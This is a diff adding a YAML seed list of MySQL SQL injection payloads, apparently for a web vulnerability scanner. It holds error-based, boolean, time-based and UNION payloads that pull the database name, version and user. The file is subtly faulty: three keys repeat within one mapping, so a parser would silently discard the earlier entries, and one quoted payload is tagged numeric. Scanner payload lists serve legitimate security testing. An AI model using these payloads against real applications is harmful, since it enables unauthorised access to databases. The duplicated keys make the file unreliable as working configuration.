@@ -1,0 +1,66 @@
+# MySQL-specific SQLi payloads (dbms-tagged, layered via generate_for_dbms)
+seeds:
+  sqli:
+    error:
+      - raw: "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT DATABASE())),0x7e)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE())),1)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))#"
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1 AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+    boolean_true:
+      - raw: "' AND IF(1=1,1,0)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1 AND IF(1=1,1,0)-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND IF(1=2,1,0)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1 AND IF(1=2,1,0)-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+    error:
+      - raw: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "' AND (SELECT * FROM (SELECT 1)j JOIN (SELECT 2)k)-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1' AND 1=1 UNION SELECT 1,2,3 INTO @a,@b,@c-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+    boolean_true:
+      - raw: "' AND 1=1 AND SUBSTR((SELECT DATABASE()),1,1)>'a'-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+    boolean_false:
+      - raw: "' AND 1=2 AND SUBSTR((SELECT DATABASE()),1,1)>'a'-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+    time_mysql:
+      - raw: "' AND (SELECT COUNT(*) FROM (SELECT SLEEP(3))a)-- "
+        dbms: "MySQL"
+      - raw: "1' AND SLEEP(3) AND '1'='1"
+        dbms: "MySQL"
+      - raw: "' AND BENCHMARK(10000000,SHA1('x'))-- "
+        dbms: "MySQL"
+    union:
+      - raw: "' UNION SELECT @@version,2,3-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "' UNION SELECT user(),2,3-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1 UNION SELECT version(),2,3-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+
